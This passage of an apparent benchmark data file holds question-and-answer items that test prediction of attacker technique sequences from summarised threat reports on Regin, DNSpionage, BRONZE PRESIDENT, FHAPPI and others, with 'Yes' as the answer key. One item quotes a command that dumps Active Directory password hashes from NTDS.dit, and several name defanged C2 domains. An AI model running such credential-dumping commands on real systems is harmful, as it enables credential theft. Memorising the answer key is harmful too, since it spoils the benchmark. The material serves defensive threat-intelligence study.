2282,383,383-Collection-T1213-Data from Information Repositories,"After discovering information on processes and memory utilization to scan for deleted files and monitor network traffic to Microsoft IIS web servers, is Regin likely to crawl through the file system and gather computer information for the purpose of collection before encoding and embedding payload information within cookie data during exfiltration?","Collection: Regin's collection capabilities are extensive, including several remote access Trojan (RAT) features such as capturing screenshots and taking control of the mouse's point-and-click functions. It can also gather computer information, steal passwords, monitor network traffic, and crawl through the file system. Advanced payload modules are designed to sniff low-level network traffic and exfiltrate data through various channels.","Initial Access: The CTI report by Symantec Security Response identifies Regin as a sophisticated multi-staged modular threat, with the initial stage (Stage 1) involving the installation and configuration of the threat's internal services. The report, however, does not provide a specific infection vector, stating that it varies among targets and is unconfirmed at the time of writing. It suggests that targets may be tricked into visiting spoofed versions of well-known websites, and the threat may be installed through a web browser or by exploiting an application. In one instance, Regin was observed originating from Yahoo! Instant Messenger through an unconfirmed exploit.
Execution: Regin's execution process is detailed through its multi-staged architecture, which includes six stages. Stage 0, the dropper, is responsible for installing Regin onto the target computer. Stage 1 involves loading a kernel driver that executes Stage 2. Stage 2 is another kernel driver that extracts, installs, and runs Stage 3. Stage 3, a kernel mode DLL, provides a framework for higher-level stages and loads Stage 4. Stage 4 consists of a user-mode orchestrator and multiple kernel payload modules, which are stored in encrypted virtual file system (EVFS) containers. Stage 5 brings into play the main Regin payload functionality, with files injected into services.exe by Stage 4.
Persistence: The CTI report does not provide explicit details on the persistence mechanisms used by Regin, but the multi-staged architecture and the use of kernel drivers and EVFS containers suggest that Regin is designed to maintain a long-term presence on infected systems.
Defense Evasion: Regin employs advanced techniques to conceal itself and its activities on compromised computers. It uses encrypted data blobs stored in non-traditional file storage areas such as the registry, extended attributes, or raw sectors at the end of the disk. The threat's stealth combines many advanced techniques to remain under the radar, making analysis difficult as all components must be available to fully understand it.
Credential Access: Regin is capable of stealing passwords and monitoring network traffic, which may include credential information. It can also scan for deleted files on an infected computer and retrieve them. Specific modules within Regin are designed to steal passwords, such as those for Windows Explorer credentials and Internet Explorer LegacySettings.
Discovery: Regin's discovery capabilities include gathering information on processes and memory utilization, scanning for deleted files, and retrieving them. It can also monitor network traffic to Microsoft Internet Information Services (IIS) web servers and collect administration traffic for mobile telephony base station controllers.
Command and Control: Regin's command-and-control (C&C) operations are extensive and bidirectional, allowing attackers to initiate communications with compromised computers or vice versa. Compromised computers can serve as a proxy for other infections, and C&C can happen in a peer-to-peer fashion. All communications are strongly encrypted and can use transport protocols such as ICMP, UDP, TCP, and HTTP. The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage 5 payloads, such as C375h and 1Bh.
Exfiltration: Regin's exfiltration capabilities include encoding and embedding payload information within cookie data under various names for HTTP-based C&C. It can also exfiltrate data through channels like TCP, UDP, ICMP, and HTTP. The threat logs data to the ApplicationLog.dat file, which is encrypted and compressed.",Yes,regin-analysis
2283,383,383-Collection-T1049-System Network Connections Discovery,"After gathering information on processes and memory utilization and scanning for deleted files during the discovery phase, is Regin likely to monitor network traffic and sniff low-level network traffic for collection purposes?","Collection: Regin's collection capabilities are extensive, including several remote access Trojan (RAT) features such as capturing screenshots and taking control of the mouse's point-and-click functions. It can also gather computer information, steal passwords, monitor network traffic, and crawl through the file system. Advanced payload modules are designed to sniff low-level network traffic and exfiltrate data through various channels.","Initial Access: The CTI report by Symantec Security Response identifies Regin as a sophisticated multi-staged modular threat, with the initial stage (Stage 1) involving the installation and configuration of the threat's internal services. The report, however, does not provide a specific infection vector, stating that it varies among targets and is unconfirmed at the time of writing. It suggests that targets may be tricked into visiting spoofed versions of well-known websites, and the threat may be installed through a web browser or by exploiting an application. In one instance, Regin was observed originating from Yahoo! Instant Messenger through an unconfirmed exploit.
Execution: Regin's execution process is detailed through its multi-staged architecture, which includes six stages. Stage 0, the dropper, is responsible for installing Regin onto the target computer. Stage 1 involves loading a kernel driver that executes Stage 2. Stage 2 is another kernel driver that extracts, installs, and runs Stage 3. Stage 3, a kernel mode DLL, provides a framework for higher-level stages and loads Stage 4. Stage 4 consists of a user-mode orchestrator and multiple kernel payload modules, which are stored in encrypted virtual file system (EVFS) containers. Stage 5 brings into play the main Regin payload functionality, with files injected into services.exe by Stage 4.
Persistence: The CTI report does not provide explicit details on the persistence mechanisms used by Regin, but the multi-staged architecture and the use of kernel drivers and EVFS containers suggest that Regin is designed to maintain a long-term presence on infected systems.
Defense Evasion: Regin employs advanced techniques to conceal itself and its activities on compromised computers. It uses encrypted data blobs stored in non-traditional file storage areas such as the registry, extended attributes, or raw sectors at the end of the disk. The threat's stealth combines many advanced techniques to remain under the radar, making analysis difficult as all components must be available to fully understand it.
Credential Access: Regin is capable of stealing passwords and monitoring network traffic, which may include credential information. It can also scan for deleted files on an infected computer and retrieve them. Specific modules within Regin are designed to steal passwords, such as those for Windows Explorer credentials and Internet Explorer LegacySettings.
Discovery: Regin's discovery capabilities include gathering information on processes and memory utilization, scanning for deleted files, and retrieving them. It can also monitor network traffic to Microsoft Internet Information Services (IIS) web servers and collect administration traffic for mobile telephony base station controllers.
Command and Control: Regin's command-and-control (C&C) operations are extensive and bidirectional, allowing attackers to initiate communications with compromised computers or vice versa. Compromised computers can serve as a proxy for other infections, and C&C can happen in a peer-to-peer fashion. All communications are strongly encrypted and can use transport protocols such as ICMP, UDP, TCP, and HTTP. The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage 5 payloads, such as C375h and 1Bh.
Exfiltration: Regin's exfiltration capabilities include encoding and embedding payload information within cookie data under various names for HTTP-based C&C. It can also exfiltrate data through channels like TCP, UDP, ICMP, and HTTP. The threat logs data to the ApplicationLog.dat file, which is encrypted and compressed.",Yes,regin-analysis
2292,384,384-Discovery-T1087-Account Discovery,"After DNSpionage malware decodes a PE file encoded with base64 and executes it as a scheduled task as part of its execution phase, is it likely that it will retrieve the username, hostname, and domain information to understand the environment during the discovery phase?","Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",Yes,DNSpionage Campaign Targets Middle East
2296,384,384-Resource Development-T1587-Develop Capabilities,"Before leveraging two fake websites and generating Let's Encrypt certificates as part of their resource development efforts, is it likely that the DNSpionage attackers conducted reconnaissance to understand the victims' network infrastructure and targeted specific domains in Lebanon and the UAE?","Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",Yes,DNSpionage Campaign Targets Middle East
2311,385,385-Exfiltration-T1537-Transfer Data to Cloud Account,"After compressing and encrypting large chunks of data and staging them for exfiltration, is it likely that the adversary will execute custom-built malware to exfiltrate the processed files to cloud storage web services such as Dropbox, Google Drive, or OneDrive after collecting data from an information repository like Microsoft SharePoint Online during the collection phase?","Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2336,389,389-Execution-T1059-Command and Scripting Interpreter,"After a phishing email containing a malicious PowerPoint add-in document with an auto-open VBA macro is used to gain initial access, is it likely that the VBA macro will execute commands using 'mshta.exe' to download and execute a dropper from a Blogspot URL before the malware establishes persistence by creating a scheduled task to execute 'mshta.exe' with a specific URL every two hours?","Execution: The VBA macro within the '.ppa' file used the 'mshta.exe' tool to download and execute a dropper from a Blogspot URL. The downloaded web page, while appearing benign, concealed VBScript code in an invisible blog post. This script was falsely attributed to 'Microsoft Corp.' and was responsible for executing a series of malicious actions, including storing a base64 encoded version of the 'RevengeRAT' payload in the registry, decoding and executing the payload, and creating and executing another VBScript to download a new payload from 'hxxp://cdtmaster.com[.]br'.","Initial Access: The Cybaze-Yoroi ZLab researchers discovered a malware campaign targeting the Italian automotive sector, delivered via a phishing email impersonating a senior partner of the Brazilian law firm 'Veirano Advogados'. The email contained a PowerPoint add-in document with a '.ppa' extension, which included an auto-open VBA macro designed to execute further malicious activities.
Persistence: The malware established persistence by creating a scheduled task to run the 'mshta.exe' utility with the URL 'hxxps://pocasideiascdt.blogspot[.]com/' every two hours, ensuring continuous execution of the malicious code.
Command and Control: The 'RevengeRAT' payload, once executed, established communication with its command and control servers, sending victim machine information to two different C2 destinations: 'office365update[.]duckdns.org' and 'systen32.ddns[.]net'. If one server was down, the malware would fall back to the other. Both C2 servers were unresponsive at the time of writing, but their IP resolutions suggested that the attacker's infrastructure could be located in Canada and Brazil.
Others: The 'Document.exe' file, characterized by a Pokemon Megaball image as its icon, was hosted at 'cdtmaster.com[.]br' and downloaded by the 'Z3j.vbs' script. Its sole purpose was to deploy and run the 'Outlook.exe' payload. The 'Outlook.exe' payload, when executed, did not show any immediate signs of activity but opened a listening TCP socket on localhost. The researchers were still analyzing the 'Outlook.exe' sample to determine its true behavior. The attack could not be attributed to a specific threat actor, but there were common TTPs with previous reports, such as the use of shared infrastructure as a drop-server and the use of popular RATs as backdoors. The domain 'cdtmaster.com[.]br' also hosted other suspicious files, including a variant of 'njRAT'. The indicators of compromise included various URLs and IP addresses associated with the campaign, as well as a registry key used for persistence. Yara rules were provided for detection of related malware samples.",Yes,The Enigmatic Roma225 Campaign
2339,39,39-Initial Access-T1566-Phishing,"After BRONZE PRESIDENT develops and uses tools like PlugX for resource development, is it likely that they will employ WMI event consumers and scheduled tasks for persistence after gaining initial access via phishing emails containing ZIP attachments with LNK files?",Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.,"Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2357,39,39-Lateral Movement-T1021-Remote Services,"After using tools like Nmap and Nbtscan to understand the target network environment and identify opportunities for lateral movement, is BRONZE PRESIDENT likely to leverage Wmiexec and net commands to execute WMI commands and connect to other hosts using compromised credentials before targeting specific data types and using batch scripts to collect and archive files for exfiltration?",Lateral Movement: The group leverages Wmiexec extensively to move laterally and execute WMI commands on remote hosts. They also use net commands to connect to other hosts using compromised credentials.,"Reconnaissance: The BRONZE PRESIDENT cyberespionage group, likely based in the People's Republic of China (PRC), has been observed targeting non-governmental organizations (NGOs) and political and law enforcement organizations in South and East Asia since mid-2018. The group uses phishing lures related to national security, humanitarian, and law enforcement topics to gather information.
Resource Development: BRONZE PRESIDENT has developed its own remote access tools and also utilizes publicly available tools. The group's infrastructure is linked to entities within the PRC and PRC-based Internet service providers. Tools such as PlugX, historically leveraged by PRC-based groups, are part of their arsenal.
Initial Access: BRONZE PRESIDENT likely uses phishing emails with ZIP attachments containing LNK files as an initial access vector. The group has been observed gaining administrator access to all systems within a targeted business unit and installing remote access tools on a significant number of hosts.
Execution: The group employs a variety of tools for execution, including Cobalt Strike, PlugX, ORat, and RCSession. Cobalt Strike is installed on over 70% of accessible hosts in some intrusions, and RCSession is installed via DLL side-loading.
Persistence: BRONZE PRESIDENT uses WMI event consumers and scheduled tasks to maintain persistence on compromised hosts. The group creates and maintains tasks like the Sysdriver scheduled task to periodically execute payloads.
Privilege Escalation: After compromising a network, BRONZE PRESIDENT elevates privileges and installs malware on a large proportion of systems. The group uses native tools like vssadmin on domain controllers to create volume shadow copies and retrieve NTDS.dit files containing password hashes.
Defense Evasion: BRONZE PRESIDENT takes steps to minimize detection, such as deleting volume shadow copies after use and killing processes post-execution. The group installs malware on many hosts but exercises restraint to avoid detection.
Credential Access: The group collects credentials from high-privilege network accounts and reputationally sensitive accounts, such as social media and webmail accounts. They also extract password hashes from NTDS.dit files for offline exploitation.
Discovery: BRONZE PRESIDENT uses tools like Nmap, Nbtscan, net user, and ping commands to understand network environments and identify opportunities for lateral movement.
Collection: BRONZE PRESIDENT targets specific data types and uses custom batch scripts to collate identified files into archives. They use scripts named after various file extensions to collect files from specific locations.
Command and Control: The group's C2 techniques vary based on the remote access tools used. RCSession communicates with a hard-coded C2 server using a custom protocol, while ORat uses a raw socket protocol. Cobalt Strike uses malleable C2 profiles and connects to multiple C2 domains.
Exfiltration: BRONZE PRESIDENT uses tools like RCSession and Cobalt Strike to exfiltrate archived data. They target specific data types and use custom batch scripts to create lists of files with predefined criteria for exfiltration.
Others: Secureworks Counter Threat Unit researchers have been monitoring BRONZE PRESIDENT activity since mid-2018, with artifacts suggesting network intrusions dating back to 2014. The group's long-term objective appears to be monitoring target networks. BRONZE PRESIDENT's systemic long-term targeting does not align with patriotic or criminal threat groups, suggesting government sponsorship or tolerance.",Yes,BRONZE PRESIDENT Targets NGOs
2362,391,391-Execution-T1059-Command and Scripting Interpreter,"After the FHAPPI campaign delivered an APT phishing email containing a link to malware hosted on a Geocities website and the VBScript downloaded and opened a .doc file leading to its execution, is it likely that the PowerShell command will run base64 encoded code and that the malware will use PowerShell for further execution?","Execution: The VBScript created an object in the shell and executed a PowerShell command to run base64 encoded code. This code led to the download and execution of a .ps1 file from another URL. The .ps1 file contained more base64 encoded code, which, when decoded, revealed the infection code for both 32-bit and 64-bit systems. The malware masqueraded as a 'Security Update' process and used PowerShell to execute the base64 code.","Initial Access: The FHAPPI campaign involved an APT phishing email containing a link to malware hosted on a Geocities website. The email's contents are undisclosed due to the sensitive nature of an APT attack. The malware, hosted under the account 'vbiayay1', was a VBScript encoded script. This script, when executed, would download a .doc file and open it, leading to the execution of a PowerShell attack to infect the victim's system with Poison Ivy.
Defense Evasion: The FHAPPI campaign utilized multiple encodings and wraps to avoid detection, including multilayered base64 encoding. The attack was fileless, avoiding known signatures, and did not originate from the attacker's territory, improving the chances of a successful APT campaign.
Command and Control: The malware communicated with a C2 server located at the IP address 61.97.243.15, a dial-up IP in South Korea. The domain used for C2 communication was 'web.outlooksysm.net', registered to an individual in China. The WHOIS information for the domain included contact details for 'Liu Ying'.
Others: The FHAPPI campaign was first recognized in Japan and named 'Free Hosting (pivoted) APT PowerSploit Poison Ivy' (FHAPPI). The campaign utilized Geocities Japan for hosting malware and targeted victims with a modified PowerSploit PoC code. The main payload was Poison Ivy, injected into the 'userinit.exe' process. The campaign also targeted Mongolian users with documents in Mongolian. The malware actions included extracting victim information, calling back to a C2 server, and other nefarious activities. The campaign was linked to a larger APT campaign and utilized email addresses 'wisers.data@gmail.com' and 'health.pro.demo30@gmail.com' for phishing. The CNC IP address and the email sender addresses are recommended to be blocked and traced. The malware files associated with the campaign have been deleted with the help of Yahoo Incident Response Division (YIRD), JP-CERT/CC, and other security professionals in Japan.",Yes,english-report-of-fhappi-freehosting
2367,392,392-Defense Evasion-T1070-Indicator Removal,"After netsat.exe executes commands from an encrypted file to infect removable media and collect system files, is it likely for the malware system to perform recursive directory listings and collect system details before cleaning up indicators of its presence by deleting key artifacts?","Defense Evasion: The malware system includes features to clean up after itself by deleting key indicators of its presence. It also employs date sensitivity, deleting itself after a hardcoded date to avoid detection.","Initial Access: The General Dynamics Fidelis Cybersecurity forensics team discovered a sophisticated malware system designed for data collection from individual computer systems, potentially optimized for insider agents or for targeting networks and air-gapped systems. The malware, identified as netsat.exe, netui3.dll, and winmgt.dll, infects removable media and collects data from drives when reconnected to the system. The malware self-deletes if the system date is past a hardcoded date, indicating a form of date checking for operational duration.
Execution: The malware netsat.exe operates as a master program, infecting connected removable media and collecting data from infected drives. It receives commands from an encrypted file on the local system, suggesting a command and control (C2) mechanism. The malware components netui3.dll and winmgt.dll serve as field units, collecting system information and files from connected systems and shared drives.
Discovery: The malware components netui3.dll and winmgt.dll collect detailed information from systems they infect, including IP addresses, platform details, system names, versions, domain controller status, network join status, OS version, running time, computer and user names, system directories, current date and time, locale information, drive details, network adapter descriptions, and recursive directory listings.
Collection: The malware collects data in the form of files, which may be obfuscated via a custom XOR operation. The collected data is presumably exfiltrated via other means not identified in the report.
Command and Control: Command and control (C2) is accomplished via commands in an encrypted file stored on the local 'master' system, indicating the need for either remote or local intruder access to the 'master' system or a C2 delivery/retrieval component.
Exfiltration: The means of exfiltration are not determined, but the data collection functionality of netsat.exe suggests that data for exfiltration might be collected by the 'master' system, indicating the need for either remote or local intruder access to the 'master' system or an exfiltration mechanism in the form of another piece of code.
Others: The Fidelis XPS advanced threat defense system has been updated with rules to detect various components of this malware system. Additional reverse engineering and analysis are ongoing. The malware system's unique functionality and potential for employment against a wide range of targets make it a significant concern for the network security community.",Yes,FTA 1001 FINAL 1.15.14
2369,392,392-Discovery-T1082-System Information Discovery,"After netsat.exe infects connected removable media and collects data from infected drives during execution, is it likely that netui3.dll and winmgt.dll will collect detailed system information before the malware self-deletes based on a hardcoded date for defense evasion?","Discovery: The malware components netui3.dll and winmgt.dll collect detailed information from systems they infect, including IP addresses, platform details, system names, versions, domain controller status, network join status, OS version, running time, computer and user names, system directories, current date and time, locale information, drive details, network adapter descriptions, and recursive directory listings.","Initial Access: The General Dynamics Fidelis Cybersecurity forensics team discovered a sophisticated malware system designed for data collection from individual computer systems, potentially optimized for insider agents or for targeting networks and air-gapped systems. The malware, identified as netsat.exe, netui3.dll, and winmgt.dll, infects removable media and collects data from drives when reconnected to the system. The malware self-deletes if the system date is past a hardcoded date, indicating a form of date checking for operational duration.
Execution: The malware netsat.exe operates as a master program, infecting connected removable media and collecting data from infected drives. It receives commands from an encrypted file on the local system, suggesting a command and control (C2) mechanism. The malware components netui3.dll and winmgt.dll serve as field units, collecting system information and files from connected systems and shared drives.
Defense Evasion: The malware system includes features to clean up after itself by deleting key indicators of its presence. It also employs date sensitivity, deleting itself after a hardcoded date to avoid detection.
Collection: The malware collects data in the form of files, which may be obfuscated via a custom XOR operation. The collected data is presumably exfiltrated via other means not identified in the report.
Command and Control: Command and control (C2) is accomplished via commands in an encrypted file stored on the local 'master' system, indicating the need for either remote or local intruder access to the 'master' system or a C2 delivery/retrieval component.
Exfiltration: The means of exfiltration are not determined, but the data collection functionality of netsat.exe suggests that data for exfiltration might be collected by the 'master' system, indicating the need for either remote or local intruder access to the 'master' system or an exfiltration mechanism in the form of another piece of code.
Others: The Fidelis XPS advanced threat defense system has been updated with rules to detect various components of this malware system. Additional reverse engineering and analysis are ongoing. The malware system's unique functionality and potential for employment against a wide range of targets make it a significant concern for the network security community.",Yes,FTA 1001 FINAL 1.15.14
2370,392,392-Collection-T1560-Archive Collected Data,"After discovering detailed system information and file listings through components like netui3.dll and winmgt.dll during the Discovery phase, is it likely that the malware will archive collected data using a custom XOR operation for obfuscation before exfiltrating it via other unidentified means during the Collection phase?","Collection: The malware collects data in the form of files, which may be obfuscated via a custom XOR operation. The collected data is presumably exfiltrated via other means not identified in the report.","Initial Access: The General Dynamics Fidelis Cybersecurity forensics team discovered a sophisticated malware system designed for data collection from individual computer systems, potentially optimized for insider agents or for targeting networks and air-gapped systems. The malware, identified as netsat.exe, netui3.dll, and winmgt.dll, infects removable media and collects data from drives when reconnected to the system. The malware self-deletes if the system date is past a hardcoded date, indicating a form of date checking for operational duration.
Execution: The malware netsat.exe operates as a master program, infecting connected removable media and collecting data from infected drives. It receives commands from an encrypted file on the local system, suggesting a command and control (C2) mechanism. The malware components netui3.dll and winmgt.dll serve as field units, collecting system information and files from connected systems and shared drives.
Defense Evasion: The malware system includes features to clean up after itself by deleting key indicators of its presence. It also employs date sensitivity, deleting itself after a hardcoded date to avoid detection.
Discovery: The malware components netui3.dll and winmgt.dll collect detailed information from systems they infect, including IP addresses, platform details, system names, versions, domain controller status, network join status, OS version, running time, computer and user names, system directories, current date and time, locale information, drive details, network adapter descriptions, and recursive directory listings.
Command and Control: Command and control (C2) is accomplished via commands in an encrypted file stored on the local 'master' system, indicating the need for either remote or local intruder access to the 'master' system or a C2 delivery/retrieval component.
